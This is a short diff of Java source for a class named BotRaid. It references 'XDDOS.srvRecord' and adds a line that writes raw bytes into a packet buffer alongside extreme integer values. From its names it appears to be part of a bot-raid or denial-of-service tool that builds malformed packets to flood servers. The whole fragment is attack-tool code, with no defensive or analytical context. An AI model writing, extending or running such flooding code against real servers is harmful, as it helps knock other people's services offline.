@@ -26,6 +26,7 @@ public class BotRaid
         ByteBuf b = Unpooled.buffer();
         ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
         try {
+            bbbb.write(bytes);
             bbbb.writeBytes(XDDOS.srvRecord);
             bbbb.writeInt(-2147483648);
             bbbb.writeInt(2147483647);
